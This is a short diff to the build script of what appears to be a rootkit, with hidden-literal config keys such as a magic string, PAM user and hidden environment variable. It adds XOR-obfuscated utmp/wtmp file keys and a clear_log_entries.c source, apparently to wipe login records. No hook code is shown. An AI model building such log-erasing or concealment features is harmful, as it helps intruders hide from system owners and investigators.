@@ -68,6 +68,8 @@ CONFIG_KEYS = {
         "MAGIC_STRING": type_hidden_literal,
         "PAM_USER": type_hidden_literal,
         "HIDDEN_ENV_VAR": type_hidden_literal,
+        "UTMP_FILE_XOR": type_hidden_literal,
+        "WTMP_FILE_XOR": type_hidden_literal,
         }
 
 def get_config(lines, check_missing_vars=True):
@@ -322,6 +324,7 @@ def run_build_command(cmd):
 SOURCES = [
         "src/init.c",
         "src/attacker.c",
+        "src/clear_log_entries.c",
         ]
 # automagically add every hooks to SOURCES
 SOURCES += glob("src/hooks/*.c")
